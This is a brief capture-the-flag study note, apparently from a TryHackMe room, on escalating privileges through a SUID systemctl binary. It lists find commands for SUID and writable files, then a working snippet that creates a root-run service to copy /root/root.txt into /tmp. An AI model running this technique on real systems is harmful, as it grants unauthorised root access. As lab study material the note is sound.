#THM 

#### Priviledge Escalation with /bin/systemctl

* find interesting SUID files that can be used for PrivEsc.

```bash
find . -perm /4000
```
* in this case : /bin/systemctl
* Find files/directories that are writeable
```bash
find -type f -maxdepth 2 -writable
find -type d -maxdepth 2 -writable
```
* [GUIDE](https://alvinsmith.gitbook.io/progressive-oscp/untitled/vulnversity-privilege-escalation)
	* create a new serivce which runs as root and puts the output to a new file we have accsess to
```bash
sudo install -m =xs $(which systemctl) .

TF=$(mktemp).service
echo'[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```
* we now have a output file in /tmp/ which holds the output of the command ran as root